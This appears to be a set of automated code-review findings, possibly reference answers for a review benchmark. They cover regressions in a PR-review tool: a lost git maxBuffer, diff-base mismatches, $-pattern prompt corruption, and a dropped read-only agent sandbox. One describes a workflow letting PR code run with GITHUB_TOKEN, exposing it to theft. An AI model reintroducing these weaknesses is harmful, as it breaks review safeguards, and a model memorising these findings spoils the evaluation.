findings.whyItBreaks: spawnSync default maxBuffer is 1MB. For the core call `git(["diff", mergeBase, headSha], cwd)` (line 140) the diff output is the review bundle's `patch`. Any PR whose diff exceeds ~1MB makes spawnSync return status=null with an ENOBUFS error; the code then throws `git diff ... failed: ` (empty stderr), landing in runGithub's catch, which posts a failure check run and exits 1 — the review is skipped entirely for large PRs. Verified empirically with a 2MB-output spawnSync probe (status null, signal SIGTERM, ENOBUFS) and confirmed the sibling gh/ghText helpers still carry maxBuffer 64MB, so this is an inconsistent regression, not a baseline.

findings.title: git() lost 64MB maxBuffer — large-PR diffs now crash the adapter
findings.whyItBreaks: spawnSync defaults to a 1MB maxBuffer (verified on Node v24: over 1MB stdout yields res.error=ENOBUFS, res.status=null). git diff mergeBase headSha (line 140) and git diff --name-only (line 56) feed the review patch and changed files; any PR whose diff exceeds 1MB will make res.status null, so the status!==0 check throws and the error escapes runGithub OUTSIDE the try/catch at line 176 — the failure-check-posting path (lines 182-193) never runs, so the GitHub Check is never posted and the review silently does not happen. Errors here also lose the original ENOBUFS cause (stderr is empty, message is 'git diff ... failed:').

findings.title: bundle.baseSha no longer matches the base used to compute patch/changedFiles
findings.whyItBreaks: Patch (line 140) and changedFiles (line 141, via changedFileSet using mergeBase, lines 57-58) are both computed against mergeBase = git merge-base baseSha headSha (line 139), but the bundle now carries baseSha = PR_BASE_SHA ?? merge-base(origin/main, HEAD) (line 138). When baseSha differs from mergeBase — e.g. PR_BASE_SHA is set to a base commit that is not an ancestor of headSha, or PR_HEAD_SHA is set so headSha != HEAD — the recorded baseSha disagrees with the range the patch actually covers, so a consumer reading bundle.baseSha to interpret the patch (or to label the PR's base) misreads the diff. Previously baseSha was exactly mergeBase, matching the range.

findings.title: git() lost its 64MB maxBuffer; large diffs now throw ENOBUFS
findings.whyItBreaks: The removed maxBuffer (1024*1024*64) leaves git() on Node's ~1MB default. The caller computes patch = git(["diff", mergeBase, headSha]) (line ~141), which easily exceeds 1MB on any non-trivial PR. Verified on this repo's Node v24: spawnSync without maxBuffer dies with ENOBUFS after ~1.05MB (status null, stdout truncated), so status !== 0 throws with an empty stderr ('git diff ... failed: ') because res.error is never surfaced. The review fails for every large PR (the 64MB cap is still present on the gh()/ghText() paths used for the same run).

findings.title: bundle.baseSha now diverges from the merge-base used for patch/changedFiles
findings.whyItBreaks: baseSha = process.env.PR_BASE_SHA || git merge-base origin/main HEAD (line ~138) can differ from mergeBase = git merge-base baseSha headSha (line ~139). The patch (line ~141) and changedFiles (line ~142, via git diff --name-only mergeBase HEAD) are both computed from mergeBase, but the bundle now reports baseSha as the base. When origin/main or PR_BASE_SHA has moved ahead of the actual common ancestor, the bundle's declared base no longer matches the base the patch/diff actually diff against, so the reviewer is handed a baseSha inconsistent with the patch it contains.

findings.title: Remove '-s read-only' from codex exec args
findings.whyItBreaks: Base had '-s read-only'; the head drops it with no replacement or rationale. runCodex spawns the codex CLI with cwd=opts.repoPath (the repo being reviewed) and no sandbox flag, so the agent runs with the CLI default sandbox (workspace-write, which permits writes inside the working directory) instead of read-only. The agent can now create/modify files in the repo it is reviewing. The flag is still valid in the installed codex-cli 0.172.0 ('-s, --sandbox <SANDBOX_MODE>: read-only | workspace-write | danger-full-access'), so this is a silent loss of a safety control, not an API migration. No caller in-repo depends on it, but the safety is the contract of this file.

findings.title: Drop of read-only sandbox from codex exec args
findings.whyItBreaks: The base explicitly passed `-s read-only`, guaranteeing that codex's model-generated shell commands run with no write/full-access sandbox. After this change the args omit any sandbox selection, so codex resolves the sandbox policy from config/defaults (possible values read-only/workspace-write/danger-full-access) instead of the guaranteed read-only mode. A codex agent run against an arbitrary `opts.repoPath` can now write files/operate beyond read-only without any caller-visible indication. This is a silent security-relevant weakening with no accompanying justification (empty PR metadata, single-line diff).

findings.title: Drop explicit read-only sandbox from shared codex exec call
findings.whyItBreaks: runCodex is the repo's only shared codex invocation point (src/shared/codex.ts). Before this diff the agent was invoked with `-s read-only`, so the model could not write to the working tree (cwd = opts.repoPath). After the edit the sandbox is whatever the installed codex CLI defaults to (and any user/project config in ~/.codex/config.toml or the repo's config) decide — potentially workspace-write, i.e. the agent can create/modify/delete files in the repo. The `--output-last-message` output file is written by the CLI itself (not by sandboxed shell commands), so there is no plausible fix-intent for removing the flag; the write to the tmp output file is not what the sandbox governs. The caller-side contract (prompt in, last-message JSON out, no repo writes) is the behavior that matters and it is weakened for no stated reason. Note: the exact default sandbox of codex-cli 0.172.0 could not be confirmed in-repo (no execution of the model allowed); whatever it is, the explicit guarantee is gone and becomes config-dependent.

findings.title: Patch/changedFiles diff base tip instead of merge-base
findings.whyItBreaks: Old code computed mergeBase = git merge-base(baseSha, headSha) and diffed mergeBase..headSha; new code diffs baseSha..HEAD directly. When PR_BASE_SHA is set (e.g. the current origin/main tip) and main has advanced past the PR's merge-base, git diff baseSha HEAD spans both the base's new commits and the PR's changes: the reviewed patch contains reverse-diffs of unrelated commits, and changedFileSet(baseSha) classifies files the PR does not touch. changedPaths then (a) feeds untrustworthy context to the reviewer and (b) lets inlineComments attach review comments to files absent from the PR diff, which makes the GitHub reviews POST fail and silently fall back to a comment-less review via the catch in postReview (github.ts ~L90-104). When PR_BASE_SHA is unset, baseSha is already the merge-base so behavior is unchanged.

findings.title: Env head SHA ignored in patch/diff
findings.whyItBreaks: Old code diffed mergeBase..headSha where headSha came from PR_HEAD_SHA; new code hard-codes "HEAD" and baseSha in the diff and in changedFileSet, so a caller passing PR_HEAD_SHA for a specific commit gets a patch/changedFiles from the checkout's current HEAD instead. headSha is still used for postReview's commit_id (line 137), so the review can be posted against one SHA while its patch/changedFiles describe another.

findings.title: Drop of merge-base re-scopes diff/changed-files to base-branch delta
findings.whyItBreaks: The old code diffed merge-base(baseSha, headSha)..headSha so the patch and changed-file set contained only the PR's own changes, regardless of what baseSha is. The new code diffs baseSha..HEAD directly. When PR_BASE_SHA is supplied (the env override the file already reads at line 138, and the only viable path here since origin/main does not exist in this repo), baseSha is the caller-supplied base, typically the target branch head, which can be ahead of the true merge base. The patch then includes every commit that landed on the base branch since the PR branched — files unrelated to this PR — and changedPaths is widened to match, so the reviewer is fed foreign changes and inline comments (filtered on changedPaths at line ~83-86) can be attached to files this PR never touched. Previously the patch also used headSha; the new patch uses HEAD, so when PR_HEAD_SHA is set and differs from HEAD the reviewed patch no longer matches the commit_id/headSha recorded in the bundle and review payload (line 137 vs 139).

findings.title: PR patch/changedFiles computed from base tip, not merge base
findings.whyItBreaks: baseSha is now env.PR_BASE_SHA (base-branch tip) or merge-base origin/main HEAD. When PR_BASE_SHA is set and the base branch has advanced since the PR branch was cut, `git diff baseSha HEAD` (and `--name-only` likewise) spans the full main..head difference: it inverts upstream commits (e.g. a file added on main shows as 'deleted file'), lists files the PR never touched, and the bundle handed to the reviewer contains those phantom hunks. I verified this in a scratch repo: fork from 3f77dff, commit pr.txt on the PR branch, add upstream.txt on main, then diff tip..pr shows pr.txt plus an inverted upstream.txt hunk and name-only lists 'pr.txt\nupstream.txt' (merge-base diff is clean and lists only pr.txt). Corrupted patch feeds false findings / a spurious changes_requested verdict; changedPaths (src/adapters/github.ts:141) then includes upstream.txt, so inlineComments (line 76) can post a finding against a file not in the PR. The previous code computed `git merge-base baseSha headSha` for exactly this reason.

findings.title: String replacement interprets $-patterns in bundle/patch, corrupting prompts
findings.whyItBreaks: String.prototype.replace with a string replacement expands special patterns ($& = matched text, $$ = literal $, $' = text after match, $` = text before match). Any bundle JSON containing such sequences (e.g. a patch adding code with .replace(/x/, "$&"), `$$`, awk `$1` in a script) is mangled before the model sees it, silently altering the review input. The original function form () => ... avoided this; the diff reverts to the unsafe form.

findings.title: Patch inserted via string replacement: $-patterns in bundle.patch corrupt the critic prompt
findings.whyItBreaks: bundle.patch is raw diff text inserted as a replacement string; any $&, $$, $', $` in the patch (common in shell/awk/JS snippets) is substituted, so the critic prompt no longer contains the actual patch. Same class of regression as line 25; affects review.ts line 32 (candidate JSON) identically.

findings.title: String-form replace corrupts $-patterns in bundle/patch
findings.whyItBreaks: The base code deliberately used the function form (() => JSON.stringify(bundle, null, 2)) so that the inserted content is treated as a literal. The diff switches all three replacements to raw string replacement, which makes String.prototype.replace interpret $-patterns in the inserted text: $$ → $, $& → the matched substring ({{BUNDLE}}/{{FINDINGS}}/{{PATCH}}), $' → everything after the match (duplicating the tail of the prompt into the patch), and $` → everything before the match. Any bundle or patch text containing $$ (e.g. Makefile recipe escaping, shell PID expansion), $' (e.g. ANSI-C quoting echo $'\n'), or $& is silently rewritten, so the review.md/critic.md prompts inject corrupted content and the critic reviews the wrong patch — deterministically, with no error signal. Verified empirically: '"{{PATCH}}".replace("{{PATCH}}", "echo $1 && echo $& && echo $$")' → 'echo $1 && echo {{PATCH}} && echo $'.

findings.title: Plain-string .replace() corrupts prompt content containing $ patterns
findings.whyItBreaks: Changing the replacer from a function (which inserts its return value verbatim) to a plain string makes String.prototype.replace interpret $-sequences in the substituted text: $' expands to everything after the placeholder, $& expands to the matched "{{PATCH}}"/"{{BUNDLE}}", $` expands to the text before it, and $$ collapses to $. Verified with node: prompt.replace("{{PATCH}}", "line with $' and $& and $$") yields "line with  AFTER and {{PATCH}} and $ AFTER" instead of the verbatim patch. The bundle JSON embeds bundle.patch, so a single patch containing e.g. a regex/replace literal like /$&/ or a shell string like $'...' silently injects/corrupts the review and critic prompts (both the reviewPrompt and the two criticPrompt replaces are affected), degrading or misdirecting the review/critic model without any error. The original function form existed precisely to avoid this and was correct.

findings.title: Fallback review POST no longer pinned to reviewed headSha
findings.whyItBreaks: The primary path (line 89) and the check run (postCheck, head_sha: headSha) both pin the result to headSha (process.env.PR_HEAD_SHA || git rev-parse HEAD, line ~170), and the review content is computed against mergeBase..headSha. The catch-all fallback previously passed commit_id=headSha; this diff removes it, so when the primary POST fails, the GitHub API defaults the review to the PR's latest commit at post time. If PR head advanced between the review computation and the (fallback) POST, or PR_HEAD_SHA pins an older commit, the verdict/event (including REQUEST_CHANGES) lands on a commit that was never reviewed while the check run still cites headSha — an inconsistent verdict record. Note the trade-off: if the primary failure is caused by an unacceptable commit_id, keeping it in the fallback would guarantee the fallback also fails; that intent is undocumented in the code, so it is worth a deliberate comment or a bounded fix rather than silent removal.

findings.title: Fallback review loses commit_id anchoring
findings.whyItBreaks: In the fallback path (after the JSON --input POST throws), the review is now POSTed with only event and body. Per GitHub's API, omitting commit_id anchors the review to the latest commit on the PR, which can differ from headSha (e.g. a force-push/update while the review ran). The review body/comments describe the diff of headSha, so the review would be attached to a different commit than the one it actually reviewed, while the companion check-run (postCheck, same file:128) still pins head_sha, producing a review/check mismatch. The primary path still passes commit_id: headSha (line 89), so this only affects the degraded fallback.

findings.title: Fallback review no longer pins commit_id to analyzed headSha
findings.whyItBreaks: The primary path still sends commit_id: headSha (line 89) for the commit the review was computed against. The fallback (taken when the primary gh call throws, e.g. comments rejected) now sends only event/body, so GitHub ties the review to the PR's latest commit at creation time rather than the analyzed headSha. If the PR head advanced while the review ran, a REQUEST_CHANGES/COMMENT verdict is attributed to a commit the bot never reviewed, and it disagrees with postCheck, which still pins head_sha (line 128).

findings.title: normalizeFinding silently coerces malformed findings into plausible high-severity findings
findings.whyItBreaks: Base behavior (default strict=true) rejected any finding with invalid severity, invalid category, missing file/title/whyItBreaks/suggestedFix, or lineStart/lineEnd <= 0 by throwing; the non-strict path dropped it. New body (lines 96-109) never validates: invalid or missing severity silently becomes "P1" (the highest plausible non-P0 rank), missing category becomes "bug", missing file becomes "", missing title becomes "Untitled finding" (truncated to 120), lineStart/lineEnd become 0 or NaN (e.g. lineStart:"abc" -> Number("abc") = NaN, lineEnd falls back to raw.lineStart ?? 0), and whyItBreaks/suggestedFix/validation become "". These junk objects are returned as real Finding values via normalizeReview's raw.findings.map(normalizeFinding) (line 131), so any consumer that persists, ranks, or reports findings will present fabricated P1 findings as validated. This is a swallowed failure on a public, exported path: the input signal (malformed) is discarded and replaced by a plausible value. Public signature change is also breaking: normalizeReview lost its strict=true parameter (base line ~131 of base), so callers relying on the strict default (or on strict=false to drop malformed findings) silently get a different behavior.

findings.title: normalizeFinding fabricates defaults instead of rejecting malformed findings
findings.whyItBreaks: Old code threw descriptive errors for invalid severity/category, missing file/title/whyItBreaks/suggestedFix, and lineStart/lineEnd <= 0; normalizeReview(raw, strict=true) also let callers drop malformed findings via strict=false. The diff deletes that entirely: invalid severity now silently becomes "P1", invalid category "bug", missing title "Untitled finding", missing file "", missing whyItBreaks/suggestedFix/validation "", missing lineStart 0, and the strict parameter (and lenient filter) is removed — so raw.findings.map(normalizeFinding) (line 131) emits every malformed finding as a valid-looking Finding with zero-confidence noise. The error signal callers used to rely on (throw or drop) is discarded; the old signature's contract (validated Finding) is no longer implemented. Additionally the null/non-object guard was dropped, so a null entry in raw.findings now crashes normalizeReview with an unhelpful TypeError at line 96 instead of the old descriptive throw. Downstream review/output consumers cannot distinguish a real P0 finding from a fabricated P1/bug/Untitled finding, and a malformed input that used to be dropped now lands in the review output as plausibly-sized data.

findings.title: lineStart/lineEnd no longer validated — 0/NaN/negative leak into Finding
findings.whyItBreaks: Old code enforced Number.isFinite(lineStart) && lineStart > 0 and the same for lineEnd. New code does Number(raw.lineStart ?? 0) and Number(raw.lineEnd ?? raw.lineStart ?? 0) with no isFinite/positive check: raw.lineStart="abc" yields NaN, raw.lineStart=-3 yields -3, a missing/empty lineEnd yields 0, and lineEnd<lineStart is never caught — a Finding typed as Number with an invalid location that downstream formatters/citations would print as "NaN"/"0" or cite at the wrong line.

findings.title: normalizeFinding silently fabricates defaults for malformed findings
findings.whyItBreaks: Base rejected malformed findings by throwing (e.g. invalid severity/category, missing file/title/whyItBreaks/suggestedFix, lineStart<=0), which normalizeReview propagated so callers could tell 'rejected' from 'valid'. HEAD removes every one of those checks and substitutes defaults: severity 'critical'→'P1' (a garbage severity inflated to a mid-critical severity), category→'bug', title→'Untitled finding', file→'' (possibly whitespace-only), whyItBreaks/suggestedFix/validation→'', lineStart→Number(raw.lineStart ?? 0) which is 0 for missing or NaN for any non-numeric string (e.g. 'abc'), and lineEnd falls back to the same value so can be 0/NaN and can be smaller than lineStart. A finding that the LLM emitted as garbage is now indistinguishable from a real one and is persisted/reported as a valid P1/bug finding. Note lineStart/lineEnd can also be inverted (lineEnd < lineStart) with no check.

findings.title: normalizeReview drops strict parameter and tolerant drop-malformed mode
findings.whyItBreaks: Signature changed from normalizeReview(raw, strict = true) to normalizeReview(raw). The old strict=false path (map+catch+filter, dropping malformed findings while keeping valid ones) is gone, so callers lose the only way to tolerate garbage findings without fabricating them. External TS callers invoking normalizeReview(raw, false) now fail to compile ('Expected 1 arguments, but got 2'), and external callers who relied on the default throwing no longer get any error signal at all — every finding is silently normalized.

findings.title: workflow_dispatch path: gh pr view loses repository context
findings.whyItBreaks: The 'Resolve PR refs' step runs before the 'Checkout PR head' step (line 42-45), so on the workflow_dispatch event (the only event where EVENT_HEAD is empty and this else branch executes — per the `if:` on line 24 and PR_NUM at line 30) the workspace contains no checked-out git repo. gh resolves the target repo from the --repo flag or GH_REPO env, then falls back to the cwd's git remote; removing both means `gh pr view "$PR_NUM"` with a bare PR number has no repo to resolve and the step (and the whole manual-dispatch run) fails with 'No default remote repository has been set' / 'could not determine repository'. Previously the REPO env from `github.repository` + -R supplied the repo explicitly. The pull_request path is unaffected (EVENT_HEAD is set there, gh is never called).

findings.title: Workflow_dispatch refs step loses repo context and fails
findings.whyItBreaks: The removed REPO env and '-R "$REPO"' were the only repo resolution for the else branch. That branch runs on workflow_dispatch (EVENT_HEAD is empty there), and the refs step executes before any actions/checkout in this self-review workflow, so the workspace has no git repository. gh pr view then fails with 'failed to run git: fatal: not a git repository' (verified locally: 'cd /tmp && GH_TOKEN=fake gh pr view 1 --json headRefOid' prints exactly that; setting GH_REPO resolves the repo and proceeds to the API). Manual PR review via workflow_dispatch — the documented manual trigger (on: workflow_dispatch with pr_number input) — now dies at step 1 instead of resolving head/base. The pull_request path is unaffected because EVENT_HEAD is always set there and the gh branch is not reached.

findings.title: Unexplained, asymmetric boolean arg on normalizeReview candidate call
findings.whyItBreaks: Line 29 now passes false as the second argument to normalizeReview while the critic call (line 38) omits it. The shared/schema module (and its signature) is not present in the repo at base or head, so the meaning of the new argument is not verifiable: if it toggles strict/throwing normalization, malformed candidate output is demoted to a coerced/defaulted value that flows into the critic prompt (line 35) and, on fallback, into the returned summary/checked (lines 45-54) instead of surfacing as a normalization failure. If it toggles a different concern, the change is an undocumented dead/no-op argument. Either way the two normalize call sites now diverge for an unstated reason, which is not merge-ready.

findings.title: normalizeReview swallows malformed output instead of throwing
findings.whyItBreaks: Base version threw on: non-object raw, non-string summary, non-array findings/checked/residual_risks. Head version returns { summary: String(raw?.summary ?? ""), findings: [], checked: [], residual_risks: [] } for ANY malformed input (including null/primitives — raw?.findings is undefined, raw?.summary is undefined). A caller that relied on the throw to distinguish 'review failed/malformed' from a real review now receives a structurally valid but empty review and may persist/report it as an actual clean result. This is a public exported API (only in-repo consumer is none, but it is the shared contract for the review pipeline); no caller can distinguish 'failed' from 'empty'.

findings.title: normalizeReview silently swallows malformed review output instead of throwing
findings.whyItBreaks: The base version threw on non-object input, non-string summary, and non-array findings/checked/residual_risks. The head version maps every one of these to [], "", and [], so a malformed/partial LLM response is indistinguishable from a legitimate empty review: callers cannot tell 'review failed' apart from 'review found nothing' and will persist/report the empty result as real. This is an exported function whose validation is its entire contract, and there are no in-repo callers to rescue the old behavior.

findings.title: normalizeReview swallows malformed output and fabricates an empty review
findings.whyItBreaks: Old contract threw 'malformed review output: ...' when raw was not an object or summary/findings/checked/residual_risks were missing or not arrays, so callers could distinguish a bad/truncated model response from a legitimate clean review. New code defaults every missing field (summary to "", findings/checked/residual_risks to []) and coerces summary with String(raw?.summary ?? ""), so a malformed or truncated review output is reported as a valid, empty, zero-finding review that looks identical to a genuinely clean result. An exported public function now conflates 'the review failed/was unparseable' with 'the review found nothing'.

findings.title: workflow_dispatch checks out wrong ref and passes empty SHA env vars
findings.whyItBreaks: The deleted 'Resolve PR refs' step was the ONLY working path for workflow_dispatch (manual trigger; pr_number input is required): it resolved head/base SHA and base branch via `gh pr view "$PR_NUM"`. The new checkout ref is `${{ github.event.pull_request.head.sha || github.ref }}` (line 29), and for a workflow_dispatch event `github.event.pull_request` is null, so the fallback is `github.ref` (e.g. refs/heads/main) — the wrong code gets checked out and reviewed (the PR being reviewed by input number is never fetched). Likewise PR_BASE_SHA and PR_HEAD_SHA (lines 45-46) are `github.event.pull_request.base.sha` / `.head.sha` — both empty for workflow_dispatch, silently downgrading the loud gh-resolution failure (which aborted the run) to a silent empty-string proceed; the CLI is then invoked with an empty diff-base/head contract and a wrong working tree. The new 'Fetch base branch' step (lines 32-35) additionally defaults the base to 'main' for dispatch runs, ignoring the PR's real base branch, so even the fetched base does not match the PR. The pull_request path is byte-for-byte equivalent to the old behavior (event head.sha + event base.sha were used before), so this regression is specific to the manual trigger.

findings.title: workflow_dispatch no longer resolves PR refs (checkout + empty SHA envs)
findings.whyItBreaks: The 'Resolve PR refs' step was deleted. For workflow_dispatch (the only way to review an arbitrary PR via inputs.pr_number), github.event.pull_request is null, so line 29 checks out github.ref (the dispatched branch, e.g. refs/heads/main — NOT the PR head), lines 45-46 pass empty PR_BASE_SHA/PR_HEAD_SHA, and the new fetch step falls back to BASE_REF='main' instead of the PR's actual base. Previously the dispatch path resolved head/base/base_ref via `gh pr view "$PR_NUM"` and checked out the PR head. Result: the manual review mode builds/reviews the base branch with no base/head SHA hints instead of the target PR.

findings.title: Workflow_dispatch path checks out wrong tree and passes empty PR SHAs
findings.whyItBreaks: For workflow_dispatch, github.event.pull_request is absent, so the `||` fallback at line 29 selects github.ref (the ref the workflow was dispatched from, e.g. refs/heads/main) instead of the PR head — the workflow now installs and runs the review tool from the dispatch branch, not the PR under review. The Needlefish step at lines 45-46 also passes PR_BASE_SHA=${{ github.event.pull_request.base.sha }} and PR_HEAD_SHA=${{ github.event.pull_request.head.sha }}, both empty in dispatch mode, and the new 'Fetch base branch' step at line 35 fetches only refs/heads/main regardless of that PR's actual base branch (line 35 falls back to 'main'). The old 'Resolve PR refs' step resolved head/base/base_ref via `gh pr view "$PR_NUM"` precisely for this event (input description line 13: 'manual trigger; bypasses pull_request webhook'), and the job's `if` guard (line 24) explicitly permits workflow_dispatch. Net effect: the manual-trigger path silently reviews the wrong tree with empty base/head SHAs instead of the requested PR.

findings.title: git() loses maxBuffer; large diffs kill git and throw an empty error
findings.whyItBreaks: Removing maxBuffer drops spawnSync's output cap from 64 MiB to Node's ~1 MiB default. The caller at src/adapters/local.ts:100 passes the full patch (git diff baseSha HEAD), which can easily exceed 1 MiB; Node then kills the child (res.status=null, res.error=ENOBUFS), the check at line 12 throws with stderr empty, producing 'git diff ... failed:' with no actionable message, and the review aborts. Verified empirically: default-capped spawnSync returns status=null, error.code=ENOBUFS at ~1.06 MB stdout. Sibling gh() (line 33) keeps maxBuffer: 64 MiB, so the asymmetry is a new regression, not intentional.

findings.title: Dropped maxBuffer caps git diff at Node's 1MB default
findings.whyItBreaks: git() previously passed maxBuffer: 1024*1024*64; the change removes it, so spawnSync uses Node's default maxBuffer (~1MB). The biggest output git() produces is `git diff baseSha HEAD` in runLocal (line ~104), whose result is the patch fed to review(). A diff over 1MB now makes spawnSync fail (res.status === null, res.error set, empty stderr), so the `res.status !== 0` check throws `git diff ... failed: ` (with no stderr, misleading) and runLocal rejects instead of reviewing. The gh() helper in the same file keeps the 64MB maxBuffer, confirming the asymmetry is accidental. name-only/merge-base/rev-parse outputs are small, but the full patch is the tool's core input, so real PRs over 1MB break the main workflow.

findings.title: git() loses 64MB maxBuffer; >1MiB diffs now crash
findings.whyItBreaks: src/adapters/local.ts:11 calls spawnSync("git", args, { cwd, encoding: "utf8" }) with no maxBuffer. Node's default maxBuffer is 1024*1024 (1 MiB); once git's stdout exceeds it, spawnSync kills the child with ENOBUFS, status becomes null, and line 12 (res.status !== 0) throws `git diff ... failed: ` with an empty stderr. The changed line is on the main review path: runLocal calls git(["diff", baseSha, "HEAD"], cwd) (and git(["diff","--name-only",...])) at lines ~103-104/105, so any PR whose diff exceeds 1 MiB aborts runLocal before review runs. Verified empirically on this repo's Node v24: a 2 MiB-output spawnSync with default options returns status null, signal SIGTERM, error ENOBUFS (stdout ~1.1 MiB), which the status!==0 check turns into a thrown error with no actionable message. The gh() wrapper right below (local.ts:38-42) keeps maxBuffer: 64 MiB, so git and gh are asymmetric — the asymmetry looks accidental.

findings.title: Error-path check conclusion downgraded from failure to neutral
findings.whyItBreaks: POST /repos/{repo}/check-runs is the merge-gating signal consumed by branch protection: previously the review-failed check used conclusion 'failure' (blocks a required check); now it is 'neutral', which required-check gating treats as passing (same as needs_human per VERDICT_CONCLUSION). The message text in the same call still says 'Review errored and did NOT pass this PR', so the conclusion contradicts the intent. The workflow job still exits 1 (process.exitCode = 1 @196), so if branch protection requires only the Actions job this is partially mitigated, but a required 'Needlefish' check-run no longer blocks; the failure signal is downgraded and conflated with a legitimate needs_human verdict.

findings.title: PR head's own code now executes with GITHUB_TOKEN
findings.whyItBreaks: The base workflow deliberately pinned the reviewer to frankekn/needlefish@main (trusted) and checked the PR head out as untrusted target into target/, with the comment stating this 'prevents a PR from controlling its own review by modifying the tool'. The new version checks out only the PR head (lines 43-47), installs that PR's own package.json/lockfile (line 51, running PR-controlled dependency lifecycle scripts before the review step), and executes the PR's own src/cli.ts (line 59) in the same workspace with GH_TOKEN=${{ secrets.GITHUB_TOKEN }} (lines 56-58) which carries pull-requests:write and checks:write on a self-hosted runner. Any same-repo PR that passes the unchanged 'if' guard can now modify src/cli.ts or an imported module to read GH_TOKEN from the process env, exfiltrate it, or alter the review/check-run result — i.e., the PR under review controls the tool that judges it. workflow_dispatch is unaffected by the repo check (if: line 19), so this path executes whatever PR head is resolved for the given pr_number as well. The new comment (lines 3-5) reframes this as 'self-review mode' but does not mitigate the removed boundary.

findings.title: Comment points to README.md with a generic template that does not exist
findings.whyItBreaks: The new comment promises that OTHER repos can use 'the generic template in README.md (which adds a second checkout of frankekn/needlefish as the tool)'. git ls-tree/git grep confirm no README.md exists anywhere in the repo at head (only .github/workflows/review.yml and .needlefish/answers.json), and no prior README was in the base either.
